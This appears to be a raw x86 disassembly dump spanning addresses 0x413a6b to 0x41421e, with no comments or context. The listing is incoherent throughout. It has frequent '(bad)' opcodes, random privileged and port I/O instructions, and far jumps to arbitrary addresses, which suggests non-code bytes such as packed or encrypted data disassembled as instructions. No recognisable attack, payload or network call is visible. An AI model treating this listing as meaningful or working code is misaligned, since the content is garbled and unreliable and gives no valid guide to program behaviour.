  413a6b:	aad    0x1f
  413a6d:	cmp    edi,DWORD PTR [edi-0x70a67c2]
  413a73:	cmp    BYTE PTR [esi+0x61],ah
  413a76:	dec    edx
  413a77:	adc    BYTE PTR [edx+ebp*2+0x130f0796],bl
  413a7e:	add    BYTE PTR [ecx-0x16],0x8f
  413a82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a83:	sti    
  413a84:	or     cl,BYTE PTR [ebx+eiz*1+0x4a354514]
  413a8b:	and    edx,ecx
  413a8d:	call   0xe9f71a9b
  413a92:	add    edx,esp
  413a94:	stos   BYTE PTR es:[edi],al
  413a95:	inc    edx
  413a96:	sbb    eax,0xce16ebb6
  413a9b:	xor    esp,eax
  413a9d:	(bad)  
  413a9e:	sbb    eax,0x514a0166
  413aa3:	mov    bh,0x84
  413aa5:	inc    edi
  413aa6:	and    BYTE PTR ds:0xe010b44e,ch
  413aac:	xchg   esp,eax
  413aad:	dec    esi
  413aae:	gs mov bl,0x5
  413ab1:	ficomp DWORD PTR [edi-0x4b551c59]
  413ab7:	sub    edi,ebp
  413ab9:	fsincos 
  413abb:	lahf   
  413abc:	test   al,0x69
  413abe:	or     bh,BYTE PTR [edx]
  413ac0:	xchg   esi,eax
  413ac1:	fisubr WORD PTR [edi+ebp*4]
  413ac4:	jb     0x413b32
  413ac6:	sub    al,ch
  413ac8:	inc    eax
  413ac9:	cs lock jb 0x413b18
  413acd:	add    BYTE PTR [ebp+eiz*8-0x38],0x41
  413ad2:	cwde   
  413ad3:	or     al,0xa8
  413ad5:	test   DWORD PTR [ecx],esp
  413ad7:	dec    esi
  413ad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ad9:	dec    ebp
  413ada:	or     bl,dl
  413adc:	dec    eax
  413add:	lods   al,BYTE PTR ds:[esi]
  413ade:	inc    eax
  413adf:	push   0xfffffffd
  413ae1:	stos   BYTE PTR es:[edi],al
  413ae2:	jbe    0x413b35
  413ae4:	lods   al,BYTE PTR ds:[esi]
  413ae5:	jmp    DWORD PTR [edx+0x3d2fbddf]
  413aeb:	outs   dx,BYTE PTR ds:[esi]
  413aec:	jmp    0xe45e0d01
  413af1:	nop
  413af2:	jbe    0x413b43
  413af4:	pop    ebx
  413af5:	pop    ds
  413af6:	cdq    
  413af7:	inc    ebx
  413af8:	bound  eax,QWORD PTR [edi]
  413afa:	push   ecx
  413afb:	xor    esp,DWORD PTR ds:0x515f6369
  413b01:	add    eax,0xe17e955f
  413b06:	aad    0x26
  413b08:	fmul   st,st(5)
  413b0a:	ja     0x413abc
  413b0c:	add    esi,esi
  413b0e:	xor    DWORD PTR [esi],0x18270c94
  413b14:	repnz ins BYTE PTR es:[edi],dx
  413b16:	mov    ebx,0xb3892df1
  413b1b:	popa   
  413b1c:	cli    
  413b1d:	retf   
  413b1e:	add    edx,DWORD PTR [ebx+ebp*1-0x48584f8f]
  413b25:	mov    eax,0x8c07cd4f
  413b2a:	mov    edi,0xb514d3fd
  413b2f:	icebp  
  413b30:	pop    esp
  413b31:	or     al,0x4b
  413b33:	mov    bh,0x2d
  413b35:	fadd   st,st(0)
  413b37:	out    dx,eax
  413b38:	pop    ebx
  413b39:	mov    ecx,0xe2b12ab5
  413b3e:	(bad)  
  413b3f:	call   DWORD PTR [ecx+eax*2+0x7e0e7f57]
  413b46:	lods   eax,DWORD PTR ds:[esi]
  413b47:	js     0x413b56
  413b49:	dec    ecx
  413b4a:	mov    al,dh
  413b4c:	test   al,0x8d
  413b4e:	dec    esp
  413b4f:	int    0x9b
  413b51:	pop    edi
  413b52:	mov    ah,BYTE PTR ds:0x8650c9c4
  413b58:	btr    DWORD PTR [ebx-0x9951514],ebx
  413b5f:	in     eax,0x1e
  413b61:	adc    al,BYTE PTR [eax-0x289276a]
  413b67:	ret    
  413b68:	(bad)  [edx]
  413b6a:	in     eax,0x6a
  413b6c:	xchg   edx,eax
  413b6d:	jge    0x413b3d
  413b6f:	sbb    eax,0xc2be78e7
  413b74:	ins    DWORD PTR es:[edi],dx
  413b75:	pop    es
  413b76:	ficom  WORD PTR [ebp-0x56]
  413b79:	inc    eax
  413b7a:	imul   eax,DWORD PTR [esp+eax*2-0x3d7864e2],0x9419f4cb
  413b85:	cmp    BYTE PTR [eax+0xf],cl
  413b88:	or     eax,0xe2b8c670
  413b8d:	mul    DWORD PTR [ebx]
  413b8f:	cs mov ch,0x29
  413b92:	loopne 0x413bc5
  413b94:	pop    ecx
  413b95:	test   BYTE PTR [edx-0x2f],bl
  413b98:	sti    
  413b99:	hlt    
  413b9a:	test   DWORD PTR [ebx+0x69],edi
  413b9d:	lahf   
  413b9e:	mov    esi,0x50272086
  413ba3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ba4:	sti    
  413ba5:	push   edx
  413ba6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ba7:	xchg   esp,eax
  413ba8:	or     ecx,DWORD PTR [ebp-0x47293386]
  413bae:	mov    ebx,0x15f835db
  413bb3:	and    eax,eax
  413bb5:	data16 loop 0x413b55
  413bb8:	mov    ch,BYTE PTR [ecx+0x4988900b]
  413bbe:	cmp    al,0x66
  413bc0:	fcmovnbe st,st(2)
  413bc2:	das    
  413bc3:	in     eax,dx
  413bc4:	fst    DWORD PTR [esi+0xb]
  413bc7:	xor    al,0x6
  413bc9:	sub    dh,0x8
  413bcc:	aad    0xff
  413bce:	mov    al,0xd1
  413bd0:	ror    bh,1
  413bd2:	out    0xa2,eax
  413bd4:	mov    dl,0x7a
  413bd6:	sbb    al,0x32
  413bd8:	and    al,0x8b
  413bda:	or     eax,DWORD PTR [edx+0x5e]
  413bdd:	sub    al,0x9c
  413bdf:	scas   al,BYTE PTR es:[edi]
  413be0:	in     al,0xde
  413be2:	or     DWORD PTR [esi+eax*1+0x4d],ebp
  413be6:	stc    
  413be7:	mov    esp,0xc2884327
  413bec:	xchg   ch,al
  413bee:	std    
  413bef:	fs sbb al,0x58
  413bf2:	bound  ebp,QWORD PTR [esi+0x2756f03b]
  413bf8:	jns    0x413b96
  413bfa:	out    dx,al
  413bfb:	xchg   eax,ebp
  413bfd:	or     dh,bh
  413bff:	jg     0x413c40
  413c01:	rol    DWORD PTR [ecx],0x3d
  413c04:	mov    eax,ds:0x89043ae4
  413c09:	ror    DWORD PTR [ecx],cl
  413c0b:	and    BYTE PTR [ebp-0x45c91ceb],ch
  413c11:	xor    DWORD PTR [eax+0x250ab732],ebx
  413c17:	cld    
  413c18:	shl    BYTE PTR [eax+ecx*8+0x4ddbb4c6],cl
  413c1f:	ror    BYTE PTR [eax+0x13],0x6c
  413c23:	jg     0x413c14
  413c25:	sub    eax,DWORD PTR [eax]
  413c27:	push   esp
  413c28:	mov    ebx,ecx
  413c2a:	rcl    DWORD PTR ds:0xd4efdb8e,0xb2
  413c31:	iret   
  413c32:	jmp    0x413ca9
  413c34:	lock stc 
  413c36:	mov    ebp,0x9d0d213
  413c3b:	mov    bh,BYTE PTR [ecx]
  413c3d:	push   ss
  413c3e:	(bad)  
  413c3f:	(bad)  
  413c40:	mov    al,0x72
  413c42:	jmp    0x413bc5
  413c44:	fwait
  413c45:	std    
  413c46:	mov    esp,0xb16cae29
  413c4b:	jle    0x413be3
  413c4d:	in     al,0xd8
  413c4f:	stc    
  413c50:	test   eax,0x21f12cf8
  413c55:	into   
  413c56:	(bad)  
  413c57:	repz fisubr WORD PTR [esi-0x3d]
  413c5b:	pop    edx
  413c5c:	inc    eax
  413c5d:	pop    esp
  413c5e:	pop    ds
  413c5f:	sub    ebx,ecx
  413c61:	lods   eax,DWORD PTR ds:[esi]
  413c62:	mov    ecx,0xbe6af136
  413c67:	sbb    eax,DWORD PTR [ecx]
  413c69:	push   ebp
  413c6a:	jmp    0x118497e0
  413c6f:	xor    ebp,esi
  413c71:	daa    
  413c72:	mov    DWORD PTR [ebx-0x32af3c10],esi
  413c78:	shl    DWORD PTR [ebx],1
  413c7a:	pop    ds
  413c7b:	ss aad 0xdf
  413c7e:	fstp   TBYTE PTR [ebx]
  413c80:	xchg   edx,eax
  413c81:	push   ebp
  413c82:	add    ah,ah
  413c84:	ds cmp ah,BYTE PTR ss:[ecx+ebx*8-0x3f643b02]
  413c8d:	(bad)
  413c90:	dec    eax
  413c91:	test   eax,0xb28d1e92
  413c96:	jne    0x413cc9
  413c98:	lea    ecx,[esp+eiz*4-0x66]
  413c9c:	xchg   ecx,eax
  413c9d:	sbb    DWORD PTR [ebp+esi*2-0x5],ebx
  413ca1:	test   DWORD PTR [esp+edi*2-0x41],eax
  413ca5:	pop    esp
  413ca6:	cli    
  413ca7:	js     0x413cb4
  413ca9:	ds fcomi st,st(6)
  413cac:	inc    ecx
  413cad:	jno    0x413cce
  413caf:	xor    al,BYTE PTR [edi-0x4214f508]
  413cb5:	in     al,0xfd
  413cb7:	shr    bh,0x75
  413cba:	jne    0x413c49
  413cbc:	mov    bh,0xb2
  413cbe:	xor    eax,0xe18ce3ec
  413cc3:	add    bh,BYTE PTR [edi+0x2379bd65]
  413cc9:	je     0x413cdf
  413ccb:	jno    0x413c66
  413ccd:	sbb    ebp,DWORD PTR [ecx+0x2a]
  413cd0:	dec    edi
  413cd1:	(bad)  
  413cd2:	push   ds
  413cd3:	xchg   si,ax
  413cd5:	push   ebx
  413cd6:	xchg   ebx,eax
  413cd7:	jne    0x413c8a
  413cd9:	pop    ss
  413cda:	enter  0x5bc6,0x15
  413cde:	dec    esi
  413cdf:	dec    ecx
  413ce0:	dec    eax
  413ce1:	mov    bl,0x59
  413ce3:	xor    BYTE PTR [ebx-0x51bb79e5],al
  413ce9:	cmc    
  413cea:	add    DWORD PTR [edx+ebx*4-0x7e],ebp
  413cee:	mov    ah,0x52
  413cf0:	pop    ebp
  413cf1:	sti    
  413cf2:	lock push ebx
  413cf4:	(bad)  
  413cf6:	lahf   
  413cf7:	dec    eax
  413cf8:	mov    ds:0x967762ed,al
  413cfd:	adc    cl,0xf1
  413d00:	not    BYTE PTR [ecx]
  413d02:	sub    al,0x2
  413d04:	jns    0x413cb1
  413d06:	pop    ds
  413d07:	adc    dl,al
  413d09:	lock mov eax,ds:0xf567544d
  413d0f:	jae    0x413c9c
  413d11:	imul   ecx,DWORD PTR [eax+0x2e],0x85ce7c1d
  413d18:	push   es
  413d19:	mov    al,0xda
  413d1b:	in     eax,dx
  413d1c:	cmc    
  413d1d:	push   cs
  413d1e:	mov    eax,0x2aac728
  413d23:	and    eax,0xa86c8478
  413d28:	inc    esi
  413d29:	jge    0x413d2b
  413d2b:	jge    0x413d0c
  413d2d:	stos   BYTE PTR es:[edi],al
  413d2e:	xchg   esi,eax
  413d2f:	push   ebx
  413d30:	icebp  
  413d31:	in     eax,0x67
  413d33:	out    0x6c,al
  413d35:	(bad)  
  413d36:	fxch   st(1)
  413d38:	push   ds
  413d39:	mov    cl,0x20
  413d3b:	xor    al,0xbb
  413d3d:	or     al,0xd5
  413d3f:	mov    edi,0x6832157e
  413d44:	dec    ebx
  413d45:	addr16 in al,0x73
  413d48:	(bad)  
  413d49:	jl     0x413d41
  413d4b:	adc    eax,0x93057a0f
  413d50:	dec    edx
  413d51:	add    esi,DWORD PTR [ebx-0x318abe7f]
  413d57:	pop    es
  413d58:	pop    ecx
  413d59:	xchg   edx,eax
  413d5a:	jnp    0x413cf3
  413d5c:	push   esp
  413d5d:	mov    edi,?
  413d5f:	sub    ecx,edi
  413d61:	cli    
  413d62:	inc    eax
  413d63:	push   0xfa783e75
  413d68:	jno    0x413d93
  413d6a:	or     BYTE PTR [ecx+0x17],bh
  413d6d:	push   esi
  413d6e:	retf   
  413d6f:	(bad)  
  413d70:	mov    bl,0x66
  413d72:	cmp    eax,0x84bbf0de
  413d77:	dec    esp
  413d78:	popf   
  413d79:	sar    DWORD PTR [eax],0xc6
  413d7c:	rol    ebx,1
  413d7e:	hlt    
  413d7f:	mov    bh,0xb8
  413d81:	push   esi
  413d82:	outs   dx,DWORD PTR ds:[esi]
  413d83:	jns    0x413dff
  413d85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d86:	xchg   edx,eax
  413d87:	adc    eax,0xfcf18852
  413d8c:	lahf   
  413d8d:	xchg   BYTE PTR [edi+ebx*8+0x36b5bc5],cl
  413d94:	imul   esi,DWORD PTR [ecx+0x78eb9700],0xe
  413d9b:	mov    WORD PTR [eax+ebx*1-0x6c07ae8f],?
  413da2:	jle    0x413dce
  413da4:	mov    dh,0xcd
  413da6:	test   DWORD PTR [ecx],ecx
  413da8:	fidiv  DWORD PTR [eax+0x54]
  413dab:	addr16 dec ebx
  413dad:	cdq    
  413dae:	dec    ecx
  413daf:	adc    eax,0x6272763d
  413db4:	aaa    
  413db5:	sbb    al,0x7a
  413db7:	aaa    
  413db8:	data16 mov WORD PTR [edi+ecx*1+0xa],gs
  413dbd:	inc    ecx
  413dbe:	aad    0x85
  413dc0:	mov    ebx,esp
  413dc2:	dec    ecx
  413dc3:	stos   DWORD PTR es:[edi],eax
  413dc4:	fbstp  TBYTE PTR ds:0x7fa6d4b3
  413dca:	mov    BYTE PTR [edx+ecx*4],dh
  413dcd:	xchg   ebx,eax
  413dce:	daa    
  413dcf:	cmc    
  413dd0:	aam    0x79
  413dd2:	ds jl  0x413de9
  413dd5:	(bad)  
  413dd6:	mul    DWORD PTR [ecx-0x6b9fcbff]
  413ddc:	or     al,0x2e
  413dde:	sti    
  413ddf:	mov    eax,ds:0x50ce8da3
  413de4:	aad    0x41
  413de6:	sbb    eax,0xcfefa63a
  413deb:	fdivr  QWORD PTR [edi-0xe]
  413dee:	pop    esp
  413def:	jne    0x413e61
  413df1:	rcl    eax,cl
  413df3:	push   ss
  413df4:	popa   
  413df5:	jecxz  0x413e30
  413df7:	cmc    
  413df8:	adc    DWORD PTR [ecx+0x696c704b],ecx
  413dfe:	out    dx,eax
  413dff:	ins    DWORD PTR es:[edi],dx
  413e00:	es clc 
  413e02:	mov    esi,esi
  413e04:	cmp    al,0x8
  413e06:	push   ds
  413e07:	je     0x413e48
  413e09:	ins    DWORD PTR es:[edi],dx
  413e0a:	div    DWORD PTR [ebx]
  413e0c:	lods   eax,DWORD PTR ds:[esi]
  413e0d:	ins    BYTE PTR es:[edi],dx
  413e0e:	jp     0x413da2
  413e10:	sbb    eax,0x3ec976d8
  413e15:	add    DWORD PTR ds:0x39fe2cf,0xa2bec219
  413e1f:	loop   0x413e5a
  413e21:	jns    0x413dfc
  413e23:	cdq    
  413e24:	jns    0x413e69
  413e26:	mov    ecx,0x37b633e4
  413e2b:	icebp  
  413e2c:	jmp    0x9d7:0xb4d771f2
  413e33:	mov    edx,0x56a8c67
  413e38:	in     al,0xa2
  413e3a:	mov    esp,0x850d8a18
  413e3f:	lock out dx,al
  413e41:	mov    ds:0x45ceff6c,eax
  413e46:	aaa    
  413e47:	cmp    al,0xa6
  413e49:	jmp    0x642c:0xf6f19e08
  413e50:	mov    ds:0x4309dffd,eax
  413e55:	push   0xffffffab
  413e57:	div    BYTE PTR [edx]
  413e59:	mov    bl,0x8f
  413e5b:	arpl   WORD PTR [esi],di
  413e5d:	mov    dh,0xd7
  413e5f:	loopne 0x413e17
  413e61:	aas    
  413e62:	pop    edi
  413e63:	nop
  413e64:	xor    eax,0x1f486aa
  413e69:	jmp    0x6b9bee28
  413e6e:	mov    DWORD PTR [ecx],edx
  413e70:	push   eax
  413e71:	pop    esp
  413e72:	fst    QWORD PTR [edi+edx*8+0x70857eb]
  413e79:	push   esp
  413e7a:	pop    es
  413e7b:	icebp  
  413e7c:	mov    cl,0xeb
  413e7e:	pop    es
  413e7f:	fbstp  TBYTE PTR [esi]
  413e81:	jae    0x413ed7
  413e83:	push   ss
  413e84:	dec    ebp
  413e85:	push   DWORD PTR [edx+0x3f]
  413e88:	and    DWORD PTR [ecx],0x42
  413e8b:	and    BYTE PTR [esi+0x4570c97f],dl
  413e91:	and    ebp,DWORD PTR [eax+ebx*8-0x644f3cd9]
  413e98:	dec    ebx
  413e99:	xchg   BYTE PTR [ebp+eiz*8-0x17e32cfc],ch
  413ea0:	add    DWORD PTR fs:[ebp+0x339a466e],eax
  413ea7:	mov    ebx,0xd9496c8f
  413eac:	ins    BYTE PTR es:[edi],dx
  413ead:	sti    
  413eae:	pop    ebx
  413eaf:	(bad)  
  413eb1:	test   ebx,0x43641383
  413eb7:	(bad)  [ebx+0x5e]
  413eba:	(bad)  
  413ebb:	int    0x4d
  413ebd:	adc    edx,ebp
  413ebf:	cmp    al,0xe
  413ec1:	test   esi,eax
  413ec3:	dec    edx
  413ec4:	or     WORD PTR [edx+0x3f],ax
  413ec8:	jg     0x413f3d
  413eca:	enter  0x4d6a,0x37
  413ece:	mov    ds:0x68e1ca1,eax
  413ed3:	mov    ch,0x1c
  413ed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ed6:	mov    ds:0x1a783ec8,eax
  413edb:	pop    ebx
  413edc:	add    esp,DWORD PTR [eax-0x71cd4351]
  413ee2:	jae    0x413ec2
  413ee4:	inc    ebx
  413ee5:	rcl    DWORD PTR [esi],cl
  413ee7:	mov    cl,0xc
  413ee9:	dec    esi
  413eea:	lahf   
  413eeb:	cdq    
  413eec:	popa   
  413eed:	jmp    0x413e8b
  413eef:	adc    dh,ah
  413ef1:	js     0x413efe
  413ef3:	dec    esi
  413ef4:	adc    cl,ch
  413ef6:	mov    ch,0xa7
  413ef8:	loope  0x413ed2
  413efa:	fnsave [eax]
  413efc:	ds adc eax,0xd45a8cb9
  413f02:	mov    eax,ds:0x3dc6d137
  413f07:	aas    
  413f08:	loope  0x413ea8
  413f0a:	mov    cl,0xa
  413f0c:	jp     0x413eb0
  413f0e:	shl    DWORD PTR [esi+0x72e7d32],cl
  413f14:	stos   BYTE PTR es:[edi],al
  413f15:	push   ss
  413f16:	pop    ds
  413f17:	push   0x171a59a4
  413f1c:	pop    edi
  413f1d:	hlt    
  413f1e:	adc    bh,BYTE PTR [ecx+eiz*4+0x64a9f34c]
  413f25:	jle    0x413f9d
  413f27:	rcr    BYTE PTR [eax-0x10c5835e],1
  413f2d:	std    
  413f2e:	adc    al,0x60
  413f30:	sbb    ebp,edx
  413f32:	loopne 0x413f6f
  413f34:	xchg   esp,eax
  413f35:	adc    ebx,ecx
  413f37:	mov    ebp,0xfdd72a51
  413f3c:	mov    ecx,0x8a160728
  413f41:	lea    esi,[ebx-0x2d4b1d9b]
  413f47:	or     al,BYTE PTR [ebx+0x18]
  413f4a:	mov    bh,0xa4
  413f4c:	cmp    eax,0x6ea16d98
  413f51:	stos   DWORD PTR es:[edi],eax
  413f52:	jae    0x413f40
  413f54:	imul   BYTE PTR [edx+0x5d]
  413f57:	ja     0x413ee7
  413f59:	jbe    0x413f55
  413f5b:	mov    WORD PTR [esp+esi*4],gs
  413f5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f5f:	pop    ebx
  413f60:	push   esp
  413f61:	jmp    0x9a81:0xd0f3a469
  413f68:	and    dl,BYTE PTR [eax+esi*1]
  413f6b:	outs   dx,DWORD PTR ds:[esi]
  413f6c:	and    DWORD PTR [edi-0x5fbe6e17],esp
  413f72:	xor    bl,bh
  413f74:	mov    cl,0x8a
  413f76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f77:	fimul  DWORD PTR [ecx]
  413f79:	adc    eax,ebx
  413f7b:	push   eax
  413f7c:	mov    al,0xe0
  413f7e:	or     esp,0xa119f1c5
  413f84:	add    edi,DWORD PTR [ecx+0x79fb50d2]
  413f8a:	imul   ecx,ecx,0xffffff97
  413f8d:	cmp    bh,BYTE PTR [ebx]
  413f8f:	out    0xea,eax
  413f91:	in     eax,dx
  413f92:	pop    esp
  413f93:	push   0xf473a9a2
  413f98:	or     ecx,DWORD PTR ds:0x5b56136d
  413f9e:	sbb    eax,0x129e0b0c
  413fa3:	rcl    bh,1
  413fa5:	mov    edi,0x2eb7411c
  413faa:	pop    es
  413fab:	mov    esi,0xd99c807d
  413fb0:	add    ebx,edi
  413fb2:	jp     0x556ced58
  413fb8:	loop   0x414028
  413fba:	scas   eax,DWORD PTR es:[edi]
  413fbb:	loope  0x413fef
  413fbd:	xor    al,0x82
  413fbf:	mov    esi,0x2fd526db
  413fc4:	jmp    0x16c9eff7
  413fc9:	inc    ebp
  413fca:	jno    0x413f4e
  413fcc:	cmp    BYTE PTR [edi+0x55],cl
  413fcf:	xchg   edx,eax
  413fd0:	xchg   esi,eax
  413fd1:	data16 lahf 
  413fd3:	adc    al,0x25
  413fd5:	rol    BYTE PTR [ebp+0xb74413e],0xa3
  413fdc:	push   es
  413fdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fde:	mov    edi,0x38046cd1
  413fe3:	sbb    al,0x25
  413fe5:	mov    eax,ds:0x97eb5179
  413fea:	jb     0x413fe2
  413fec:	inc    ebx
  413fed:	add    bh,BYTE PTR [ecx+0x69a33f12]
  413ff3:	pslld  mm3,QWORD PTR [edi-0x5a]
  413ff7:	xchg   edx,eax
  413ff8:	icebp  
  413ff9:	pop    ds
  413ffa:	cld    
  413ffb:	add    al,0xee
  413ffd:	or     al,BYTE PTR [ecx+0x6c9dd34d]
  414003:	mov    bl,0x62
  414005:	les    esi,FWORD PTR [ecx]
  414007:	imul   DWORD PTR [eax]
  414009:	out    dx,al
  41400a:	adc    dl,BYTE PTR [esp+eax*2-0x27]
  41400e:	(bad)  
  41400f:	(bad)  
  414010:	lahf   
  414011:	push   es
  414012:	cmp    al,BYTE PTR [edx+0x4c]
  414015:	xchg   esp,eax
  414016:	retf   
  414017:	scas   al,BYTE PTR es:[edi]
  414018:	int3   
  414019:	test   BYTE PTR [eax-0x34f93f6],dh
  41401f:	popf   
  414020:	or     BYTE PTR [esp+ecx*2+0x7bc670c5],bl
  414027:	or     eax,0x14d738f7
  41402c:	add    bl,ch
  41402e:	sbb    ebp,DWORD PTR [eax]
  414030:	scas   al,BYTE PTR es:[edi]
  414031:	sbb    BYTE PTR [esp+eax*8+0x41],ah
  414035:	pop    edi
  414036:	dec    esi
  414037:	cmp    DWORD PTR [ebx-0x18],esi
  41403a:	fsub   QWORD PTR [ebx]
  41403c:	sbb    eax,0x92dc21f9
  414041:	mov    DWORD PTR [edx],eax
  414043:	sbb    ch,BYTE PTR [edi-0x5]
  414046:	inc    edi
  414047:	add    edx,DWORD PTR ds:0xca26ad3c
  41404d:	cs ret 
  41404f:	adc    DWORD PTR [ebx+0x6c],ebx
  414052:	lods   al,BYTE PTR ds:[esi]
  414053:	cmp    edx,ebp
  414055:	sub    al,0xf0
  414057:	mov    ah,0x8c
  414059:	dec    ecx
  41405a:	pop    ecx
  41405b:	into   
  41405c:	fcmovu st,st(7)
  41405e:	dec    edi
  41405f:	mov    dl,0x9d
  414061:	arpl   sp,bp
  414063:	mov    ebx,0xa0c5d1d
  414068:	mov    ds:0x87679336,al
  41406d:	fisttp QWORD PTR [edx-0x1c]
  414070:	adc    BYTE PTR gs:[eax],al
  414073:	jne    0x414000
  414075:	adc    al,0x67
  414078:	dec    eax
  414079:	xor    eax,DWORD PTR [esi+0x69]
  41407c:	test   al,0x15
  41407e:	into   
  41407f:	test   eax,0x50ffa12b
  414084:	push   eax
  414085:	xchg   DWORD PTR [ecx-0x6e],esp
  414088:	lahf   
  414089:	arpl   WORD PTR [ecx+0x1e85dd30],ax
  41408f:	in     eax,0xd7
  414091:	jmp    0x9ffb5f90
  414096:	fadd   st,st(6)
  414098:	sahf   
  414099:	test   al,0x4e
  41409b:	mov    bl,dh
  41409d:	sbb    eax,0xdb8fe80c
  4140a2:	xchg   DWORD PTR [edx],eax
  4140a4:	cld    
  4140a5:	pop    es
  4140a6:	out    dx,eax
  4140a7:	xchg   ebp,eax
  4140a8:	dec    ebx
  4140a9:	add    ecx,DWORD PTR [eax]
  4140ab:	clc    
  4140ac:	mov    bl,0x4d
  4140ae:	xlat   BYTE PTR ds:[ebx]
  4140af:	jb     0x414074
  4140b1:	pop    esi
  4140b2:	sbb    al,0x53
  4140b4:	or     ebx,ebx
  4140b6:	pop    ss
  4140b7:	xchg   esp,eax
  4140b8:	mov    dl,0xa6
  4140ba:	jnp    0x414107
  4140bc:	int3   
  4140bd:	int    0x76
  4140bf:	sub    ebp,DWORD PTR [ebx-0x10097a39]
  4140c5:	sar    ebp,cl
  4140c7:	ret    
  4140c8:	out    dx,eax
  4140c9:	popf   
  4140ca:	jbe    0x4140c1
  4140cc:	push   ecx
  4140cd:	add    eax,0xdbcd818c
  4140d2:	sbb    DWORD PTR [esi+0x2a],edx
  4140d5:	sti    
  4140d6:	inc    ebx
  4140d7:	mov    bl,0x47
  4140d9:	add    bl,BYTE PTR [ecx-0x61]
  4140dc:	mov    dl,0xf4
  4140de:	imul   BYTE PTR [eax+0x42]
  4140e1:	cdq    
  4140e2:	inc    esp
  4140e3:	std    
  4140e4:	mov    cl,0x63
  4140e6:	je     0x414077
  4140e8:	mov    esp,DWORD PTR [ebx-0x11]
  4140eb:	push   ss
  4140ec:	mov    al,0x61
  4140ee:	(bad)  
  4140f0:	sbb    al,0x8f
  4140f2:	and    al,0x36
  4140f4:	out    dx,eax
  4140f5:	jge    0x414170
  4140f7:	sub    eax,0x9a5201b2
  4140fc:	add    al,0x1b
  4140fe:	push   cs
  4140ff:	sub    dl,ch
  414101:	jle    0x4140d5
  414103:	sub    eax,0x41a655ae
  414108:	ds pop ecx
  41410a:	or     al,0x23
  41410c:	cld    
  41410d:	xchg   DWORD PTR [esi],esi
  41410f:	mov    eax,edi
  414111:	js     0x414190
  414113:	aaa    
  414114:	outs   dx,BYTE PTR ds:[esi]
  414115:	xor    al,0x1d
  414117:	dec    edi
  414118:	push   eax
  414119:	xchg   BYTE PTR [edi-0x3b964693],ch
  41411f:	jnp    0x41416b
  414121:	xchg   edi,eax
  414122:	jne    0x41412d
  414124:	pop    esi
  414125:	or     DWORD PTR [esi],edx
  414127:	push   edx
  414128:	mov    eax,DWORD PTR [ecx+esi*4]
  41412b:	scas   al,BYTE PTR es:[edi]
  41412c:	xchg   ecx,eax
  41412d:	adc    esi,edi
  41412f:	imul   eax,DWORD PTR [edi-0x1e],0xfcaaac1a
  414136:	aas    
  414137:	jnp    0x4140e9
  414139:	iret   
  41413a:	push   es
  41413b:	or     bl,bl
  41413d:	lahf   
  41413e:	adc    al,0xfb
  414140:	div    bl
  414142:	dec    esp
  414143:	dec    edi
  414144:	jne    0x414181
  414146:	out    dx,eax
  414147:	adc    esp,0xffffffb8
  41414a:	test   al,0x42
  41414c:	mov    esi,0x4b35122d
  414151:	repz and ecx,edi
  414154:	scas   eax,DWORD PTR es:[edi]
  414155:	xlat   BYTE PTR ds:[ebx]
  414156:	lods   al,BYTE PTR ds:[esi]
  414157:	test   ebp,ebp
  414159:	cwde   
  41415a:	jecxz  0x414142
  41415c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41415d:	add    dl,BYTE PTR [ebp+0x357bec96]
  414163:	push   esp
  414164:	aas    
  414165:	and    eax,0x4fb5cd29
  41416a:	int3   
  41416b:	push   0xedd76bfd
  414170:	out    0xec,eax
  414172:	inc    edx
  414173:	xchg   BYTE PTR [ebp+0x69],bl
  414176:	(bad)  
  414177:	fisub  DWORD PTR [eax]
  414179:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41417a:	sar    BYTE PTR [edi+0x6a2c0026],cl
  414180:	inc    eax
  414181:	pop    edx
  414182:	jmp    0xa621461e
  414187:	mov    DWORD PTR [edi+ecx*1-0x6e],ebp
  41418b:	push   edx
  41418c:	xor    eax,0xb48634b
  414191:	out    0xcc,al
  414193:	jo     0x414176
  414195:	adc    ah,BYTE PTR ds:0x583f68a1
  41419b:	jns    0x414204
  41419d:	es out 0xc3,eax
  4141a0:	sub    al,0x7
  4141a2:	pusha  
  4141a3:	pop    esi
  4141a4:	sbb    cl,BYTE PTR [eax-0x13031b28]
  4141aa:	ret    
  4141ab:	fsub   DWORD PTR [ebx-0x5ab23430]
  4141b1:	int    0xe3
  4141b3:	mov    esi,0xb5278da6
  4141b8:	retf   0xfcc9
  4141bb:	std    
  4141bc:	mov    dl,0x0
  4141be:	push   0x48add19d
  4141c3:	adc    dh,BYTE PTR [eax-0x3cf1987d]
  4141c9:	mov    ebx,0x1b2e551c
  4141ce:	aad    0x23
  4141d0:	repz adc eax,0xba7acea9
  4141d6:	arpl   WORD PTR [esi-0x72],di
  4141d9:	stos   DWORD PTR es:[edi],eax
  4141da:	sub    BYTE PTR [esi-0xd],cl
  4141dd:	mov    dh,0x9
  4141df:	test   dl,bl
  4141e1:	imul   BYTE PTR [ebx]
  4141e3:	out    0xc0,eax
  4141e5:	xor    BYTE PTR [edi],cl
  4141e7:	lods   al,BYTE PTR ds:[esi]
  4141e8:	into   
  4141e9:	xchg   ebp,eax
  4141ea:	add    ebp,DWORD PTR [esi-0x64]
  4141ed:	jp     0x414183
  4141ef:	cmp    al,0x5e
  4141f1:	ja     0x414210
  4141f3:	jno    0x414190
  4141f5:	fcom   DWORD PTR [edi]
  4141f7:	rcl    BYTE PTR [edi+0x6721bfe7],1
  4141fd:	inc    ecx
  4141fe:	cmp    esp,DWORD PTR [ebx-0x47]
  414201:	outs   dx,DWORD PTR ds:[esi]
  414202:	sub    eax,0xdc0b707e
  414207:	inc    edi
  414208:	jp     0x41422e
  41420a:	pop    esi
  41420b:	iret   
  41420c:	or     ch,bl
  41420e:	mov    DWORD PTR [edx+0x55],eax
  414211:	rcr    cl,cl
  414213:	jecxz  0x4141fe
  414215:	jo     0x414294
  414217:	call   0x18b5:0xf24cdd94
  41421e:	jg     0x41423c
